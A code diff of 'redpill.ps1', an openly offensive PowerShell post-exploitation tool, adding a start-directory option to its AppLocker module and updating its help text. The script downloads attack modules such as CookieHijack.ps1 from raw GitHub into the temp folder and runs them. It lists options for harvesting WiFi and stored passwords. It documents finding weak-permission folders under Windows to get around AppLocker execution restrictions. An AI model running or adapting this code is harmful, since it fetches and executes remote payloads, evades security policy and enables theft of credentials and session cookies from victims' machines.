@@ -63,6 +63,7 @@
     https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
 #>
 
+
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$StartDir="$Env:USERPROFILE", [string]$StartWebServer="false", [string]$GetConnections="false",
    [string]$WifiPasswords="false", [string]$GetInstalled="false", [string]$GetPasswords="false",
@@ -2048,7 +2049,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 18){## Corrupted download detected => DefaultFileSize: 18,6171875/KB
+      If($SizeDump -lt 18){## Corrupted download detected => DefaultFileSize: 18,64453125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2059,7 +2060,13 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
    If($AppLocker -ieq "WhoAmi"){
        powershell -File "$Env:TMP\AppLocker.ps1" -WhoAmi Groups
    }ElseIf($AppLocker -ieq "Enum"){
-       powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths"
+
+       If($StartDir -ne "$Env:USERPROFILE"){
+          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$StartDir"
+       }Else{
+          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR"
+       }
+
    }ElseIf($AppLocker -ieq "TestBat"){
        powershell -File "$Env:TMP\AppLocker.ps1" -TestBat TestBypass
    }ElseIf($AppLocker -Match '\\'){
@@ -2519,7 +2526,7 @@ If($CookieHijack -ne "False"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CookieHijack.ps1 -Destination $Env:TMP\CookieHijack.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\CookieHijack.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,623046875/KB
+      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,8291015625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\CookieHijack.ps1"){Remove-Item -Path "$Env:TMP\CookieHijack.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3825,14 +3832,28 @@ $HelpParameters = @"
       Author: @r00t-3xp10it
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
+   .DESCRIPTION
+      Applocker.ps1 module starts search recursive in %WINDIR% directory
+      location for folders with weak permissions {Modify,Write,FullControl}
+      that can be used to bypass system AppLocker binary execution policy Or
+      to execute batch scripts converted to text format if blocked by applock!
+
+   .NOTES
+      AppLocker.ps1 by Default uses 'BUILTIN\Users' Group Name to search recursive
+      for directorys with 'Write' access on %WINDIR% tree. This module also allow
+      users to sellect diferent GroupName(s), FolderRigths Or StartDir @arguments!
+
    .Parameter AppLocker
-      Accepts arguments: Enum, WhoAmi and TestBat
+      Accepts arguments: Enum, WhoAmi and TestBat (default: Enum)
+
+   .Parameter StartDir
+      The absoluct path where to start search recursive (default: %windir%)
 
    .Parameter FolderRigths
-      Accepts permissions: Modify, Write, FullControll
+      Accepts permissions: Modify, Write, FullControll, ReadAndExecute (default: Write)
 
    .Parameter GroupName
-      Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE
+      Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE (default: BUILTIN\Users)
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
@@ -3840,32 +3861,36 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
-      Test for AppLocker Batch Script Execution Restriction bypass
+      Test for AppLocker Batch Script Execution Restrictions
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker "`$Env:TMP\applock.bat"
-      Execute applock.bat through text format bypass tecnic
+      Execute applock.bat through text format applock bypass technic
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
-      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions
+      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions on it!
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
-      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions
+      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions on it!
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl" -StartDir "`$Env:PROGRAMFILES"
+      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions recursive starting in -StartDir [ dir ]
 
    .OUTPUTS
       AppLocker - Weak Directory permissions
       --------------------------------------
       VulnId            : 1::ACL (Mitre T1222)
       FolderPath        : C:\WINDOWS\tracing
+      IdentityReference : BUILTIN\\Utilizadores
       FileSystemRights  : Write
-      IdentityReference : BUILTIN\Utilizadores
 
       VulnId            : 2::ACL (Mitre T1222)
       FolderPath        : C:\WINDOWS\System32\Microsoft\Crypto\RSA\MachineKeys
+      IdentityReference : BUILTIN\\Utilizadores
       FileSystemRights  : Write
-      IdentityReference : BUILTIN\Utilizadores
    #>!bye..
 
 "@;
